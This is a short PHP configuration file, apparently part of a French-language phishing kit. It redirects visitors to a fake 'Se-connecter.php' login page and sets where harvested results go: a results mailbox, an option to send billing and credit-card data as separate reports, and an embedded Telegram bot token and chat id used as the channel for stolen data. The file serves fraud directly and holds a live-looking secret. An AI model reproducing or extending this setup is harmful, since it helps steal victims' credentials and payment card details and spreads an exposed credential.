<?php
if ($_SERVER['HTTP_HOST'] === 'monlien.com' && $_SERVER['REQUEST_URI'] === '/') {
    header('Location: /Se-connecter.php');
    exit();
}
?>
<?php


$boite_rez = ""; // BOITE REZ ICI
$envoyerBillingEnUnRez = true; // ENVERRA BILLING ET CC EN DEUX REZ DIFFERENTS

$bot_token = "7748257656:AAE1Q9TJ41aeCMJCJ-Pt6euZBFJzZgntQ8w";
$chat_id = "-4755279665";


define('APPLE_PAY_ENABLED', false);  // Définir sur false pour désactiver Apple Pay

?>
